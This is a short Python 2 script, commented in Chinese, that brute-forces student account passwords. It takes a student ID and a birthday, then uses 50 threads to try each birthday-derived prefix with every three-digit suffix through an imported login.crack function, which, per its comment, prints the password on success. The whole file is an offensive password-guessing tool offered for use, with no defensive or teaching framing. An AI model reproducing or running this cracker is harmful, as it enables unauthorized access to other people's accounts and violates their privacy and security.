#!/usr/bin/python
#coding=utf-8
from threading import Thread
from Queue import Queue
from time import sleep
import login
import sys
#q是任务队列
#NUM是并发线程总数
#JOBS是有多少任务
#SUCCEES是破解成功
q = Queue()
NUM = 50
JOBS = 1000 #计算0-1000
SUCCEES = 0 #False

print "enter stuid. e.g.:1043111063"
stuid = raw_input()
print "enter birthday. e.g.:19890604"
pwd = raw_input()
pwd = pwd[3:8]
print "wait some second..."
print #为了一个空行

#具体的处理函数，负责处理单个任务
#def login.crack(arguments):
#    print arguments
#    #这个是工作进程，负责不断从队列取数据并处理
#
def working():
    global SUCCEES
    while not SUCCEES:
        sleep(1)
        arguments = pwd + "%03d" % q.get()
        login.crack(stuid, arguments) #成功了会自动输出密码
            #SUCCEES += 1
        #print arguments #debug
        #print SUCCEES

        #if SUCCEES == True:
        #    return
        #sleep(1)
        q.task_done()
#fork NUM个线程等待队列
for i in range(NUM):
    t = Thread(target=working)
    t.setDaemon(True)
    t.start()
#把JOBS排入队列
for i in range(JOBS):
    q.put(i)
#等待所有JOBS完成
q.join()
